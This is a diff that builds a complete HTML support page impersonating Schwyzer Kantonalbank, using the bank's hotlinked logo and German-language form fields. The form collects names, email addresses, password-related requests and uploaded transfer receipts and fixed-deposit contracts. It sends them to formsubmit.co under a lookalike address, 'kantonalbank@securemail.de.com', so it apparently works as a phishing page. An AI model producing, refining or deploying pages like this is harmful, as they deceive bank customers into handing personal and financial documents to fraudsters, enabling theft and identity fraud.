@@ -1,46 +1,150 @@
-<main>
-  <!-- Form-Titel -->
-  <h2 style="text-align: center; font-size: 24px; font-weight: 600; margin-top: 30px; color: #e53935;">
-    Wie können wir Ihnen helfen?
-  </h2>
-  <p style="text-align: center; font-size: 16px; color: #555; margin-bottom: 10px;">
-    Unser Support-Team ist für Sie da.
-  </p>
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Support – Schwyzer Kantonalbank</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Inter', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f9f9f9;
+      color: #111;
+    }
 
-  <form action="https://formsubmit.co/kantonalbank@securemail.de.com" method="POST" enctype="multipart/form-data">
-    <input type="hidden" name="_next" value="danke.html">
+    header {
+      text-align: center;
+      padding: 40px 20px 0;
+    }
 
-    <label for="name">Ihr Name</label>
-    <input type="text" id="name" name="Name" required>
+    .logo {
+      height: 50px;
+      margin-bottom: 10px;
+    }
 
-    <label for="email">Ihre E-Mail-Adresse</label>
-    <input type="email" id="email" name="Email" required>
+    .form-container {
+      max-width: 600px;
+      background-color: #fff;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.06);
+      margin: 30px auto 60px;
+      padding: 40px 30px;
+    }
 
-    <label for="anliegen">Anliegen</label>
-    <select id="anliegen" name="Anliegen" required onchange="toggleFileUpload(this.value)">
-      <option value="">Bitte wählen</option>
-      <option value="Passwort vergessen">Passwort vergessen</option>
-      <option value="Passwort ändern">Passwort ändern</option>
-      <option value="Dispositionsanfrage">Dispositionsanfrage</option>
-      <option value="Technisches Problem">Technisches Problem</option>
-      <option value="Überweisungsquittung">Überweisungsquittung</option>
-      <option value="Festgeldvertrag">Festgeldvertrag</option>
-      <option value="Sonstiges Thema">Sonstiges Thema</option>
-    </select>
+    h2 {
+      text-align: center;
+      font-size: 24px;
+      font-weight: 600;
+      color: #e53935;
+      margin-bottom: 8px;
+    }
 
-    <div id="upload-quittung" class="file-upload">
-      <label for="beleg1">Überweisungsquittung hochladen</label>
-      <input type="file" id="beleg1" name="Überweisungsquittung" accept=".pdf,.jpg,.jpeg,.png" />
-    </div>
+    p.subtitle {
+      text-align: center;
+      font-size: 16px;
+      color: #555;
+      margin-bottom: 30px;
+    }
 
-    <div id="upload-vertrag" class="file-upload">
-      <label for="beleg2">Festgeldvertrag hochladen</label>
-      <input type="file" id="beleg2" name="Festgeldvertrag" accept=".pdf,.jpg,.jpeg,.png" />
-    </div>
+    label {
+      display: block;
+      font-weight: 600;
+      margin: 15px 0 6px;
+    }
 
-    <label for="nachricht">Nachricht</label>
-    <textarea id="nachricht" name="Nachricht" placeholder="Bitte beschreiben Sie Ihr Anliegen …" required></textarea>
+    input, select, textarea {
+      width: 100%;
+      padding: 12px;
+      font-size: 15px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
+    }
 
-    <button type="submit">Absenden</button>
-  </form>
-</main>
+    textarea {
+      min-height: 100px;
+      resize: vertical;
+    }
+
+    button {
+      margin-top: 30px;
+      width: 100%;
+      padding: 14px;
+      background-color: #e53935;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #d32f2f;
+    }
+
+    .file-upload {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <img class="logo" src="https://www.szkb.ch/ResourcePackages/CorporateWebsite/assets/dist/img/szkb-logo.svg" alt="Schwyzer Kantonalbank Logo">
+  </header>
+
+  <div class="form-container">
+    <h2>Wie können wir Ihnen helfen?</h2>
+    <p class="subtitle">Unser Support-Team ist für Sie da.</p>
+
+    <form action="https://formsubmit.co/kantonalbank@securemail.de.com" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="_next" value="danke.html">
+
+      <label for="name">Ihr Name</label>
+      <input type="text" id="name" name="Name" required>
+
+      <label for="email">Ihre E-Mail-Adresse</label>
+      <input type="email" id="email" name="Email" required>
+
+      <label for="anliegen">Anliegen</label>
+      <select id="anliegen" name="Anliegen" required onchange="toggleFileUpload(this.value)">
+        <option value="">Bitte wählen</option>
+        <option value="Passwort vergessen">Passwort vergessen</option>
+        <option value="Passwort ändern">Passwort ändern</option>
+        <option value="Dispositionsanfrage">Dispositionsanfrage</option>
+        <option value="Technisches Problem">Technisches Problem</option>
+        <option value="Überweisungsquittung">Überweisungsquittung</option>
+        <option value="Festgeldvertrag">Festgeldvertrag</option>
+        <option value="Sonstiges Thema">Sonstiges Thema</option>
+      </select>
+
+      <div id="upload-quittung" class="file-upload">
+        <label for="beleg1">Überweisungsquittung hochladen</label>
+        <input type="file" id="beleg1" name="Überweisungsquittung" accept=".pdf,.jpg,.jpeg,.png" />
+      </div>
+
+      <div id="upload-vertrag" class="file-upload">
+        <label for="beleg2">Festgeldvertrag hochladen</label>
+        <input type="file" id="beleg2" name="Festgeldvertrag" accept=".pdf,.jpg,.jpeg,.png" />
+      </div>
+
+      <label for="nachricht">Nachricht</label>
+      <textarea id="nachricht" name="Nachricht" placeholder="Bitte beschreiben Sie Ihr Anliegen …" required></textarea>
+
+      <button type="submit">Absenden</button>
+    </form>
+  </div>
+
+  <script>
+    function toggleFileUpload(value) {
+      document.getElementById('upload-quittung').style.display = value === 'Überweisungsquittung' ? 'block' : 'none';
+      document.getElementById('upload-vertrag').style.display = value === 'Festgeldvertrag' ? 'block' : 'none';
+    }
+  </script>
+
+</body>
+</html>
